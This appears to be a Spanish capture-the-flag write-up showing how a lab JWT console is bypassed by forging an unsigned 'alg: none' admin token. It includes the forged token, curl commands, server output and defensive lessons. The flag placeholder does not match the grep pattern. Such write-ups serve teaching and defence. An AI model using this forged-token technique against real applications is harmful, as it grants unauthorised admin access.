# Desafío 44 — Consola SICH (JWT `alg: none`)

| Campo | Valor |
|---|---|
| Evento | Código de Marte 2026-11-13 (`codigodemarte20261113`) |
| Categoría | Web / autenticación (JWT) |
| Dificultad | fácil |
| Objetivo | `http://203.0.113.10:8007` |
| Estado | ✅ resuelto |
| Flag | `flag{ejemplo}` |

## Enunciado

> La consola del SICH usa tokens JWT firmados. Los visitantes reciben un token de solo lectura; los comandos de administrador requieren rol admin.

Pista en el HTML: `<!-- seguridad: el secreto HS256 se rota cada hora, un ataque de fuerza bruta a la firma es inutil -->`.

## Reconocimiento

- `GET /` muestra un formulario «Nombre de visitante». `POST /` con `usuario=invitado`
  responde **302 a `/consola`** y entrega el cookie:

  ```
  Set-Cookie: sich_jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
              eyJ1c3VhcmlvIjoiaW52aXRhZG8iLCJyb2wiOiJ2aXNpdGFudGUifQ.
              HL4i0f3LWPLD1oEI2HpOrjU48quSGZ46XVQhLZMtlr0; Path=/
  ```

- Payload del JWT: `{"usuario":"invitado","rol":"visitante"}`, algoritmo `HS256`.
- `GET /consola` con ese token: «Token valido para invitado · rol: visitante» y
  «Modo solo lectura. Los comandos de la consola requieren rol admin.»
- `POST /consola` → 405 (solo acepta GET). Rutas existentes: `/`, `/consola`, `/salir`, `/cdm.css`.

## Análisis

La pista descarta la fuerza bruta de la clave HS256, así que el ataque no va por el secreto sino
por **cómo el servidor interpreta el header**. Si la verificación confía en el campo `alg` del
propio token, basta declarar `"alg":"none"` y enviar la firma vacía: el servidor «valida» un token
sin firma y acepta el `rol` que traiga el payload.

Token forjado:

```
header  {"alg":"none","typ":"JWT"}
payload {"usuario":"admin","rol":"admin"}
firma   (vacía)
```

Pruebas realizadas:

| Token | Resultado |
|---|---|
| HS256 legítimo (`rol=visitante`) | consola en modo lectura |
| `alg: none` + `rol: admin` | **comandos de administrador + flag** |
| `alg: None` / `alg: NONE` | también aceptados |
| HS256 con firma inventada (`AAAA`) | `Token invalido :: firma rechazada por el SICH.` |

La aceptación de `none` (en cualquier capitalización) confirma que no se exige un algoritmo fijo ni
se verifica la firma cuando `alg` es `none`.

## Solución (pasos reproducibles)

```bash
# 1) Token legítimo de visitante (solo para ver el formato)
curl -s -i -d "usuario=invitado" http://203.0.113.10:8007/ | grep -i 'set-cookie\|location'

# 2) Forjar token con alg=none y rol admin
FORGED="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c3VhcmlvIjoiYWRtaW4iLCJyb2wiOiJhZG1pbiJ9."

# 3) Consultar la consola
curl -s -H "Cookie: sich_jwt=$FORGED" http://203.0.113.10:8007/consola | grep -o 'cdm{[^}]*}'
```

Automatizado: `python scripts/solve.py` (genera el token con `alg: none`, consulta `/consola`,
extrae la flag y la deja en `flag.txt`).

```text
[*] token de visitante: {'usuario': 'invitado', 'rol': 'visitante'}
[*] token forjado (alg=none): eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c3VhcmlvIjoiYWRtaW4iLCJyb2wiOiJhZG1pbiJ9.
[+] FLAG: flag{ejemplo}
```

Respuesta del servidor:

```html
<p>Token valido para <b>admin</b> &middot; rol: <b>admin</b></p>
<div class="msg ok">Comandos de administrador habilitados:<br>
<span class="flag">flag{ejemplo}</span></div>
```

## Flag

```
flag{ejemplo}
```

## Lecciones / notas

- **Nunca confiar en el `alg` del token.** Al verificar hay que fijar explícitamente el algoritmo
  esperado (`algorithms=["HS256"]` en PyJWT) y rechazar `none`.
- `alg: none` no está prohibido por el estándar JWS, pero solo debe aceptarse cuando la integridad
  se protege por otro canal; en una app web es siempre una vulnerabilidad.
- Rotar el secreto no sirve de nada si el atacante puede saltarse la firma: la pista desvía la
  atención hacia el cracking de la clave.
- Descartado: fuerza bruta del secreto HS256, confusión RS256→HS256 (no hay clave pública
  expuesta) e inyección `kid`/`jku` (el servidor no consulta esos headers).
- Evidencia del intercambio HTTP en `evidence/` (emisión del token, consola de visitante, consola
  admin forjada y rechazo de una firma HS256 inválida).
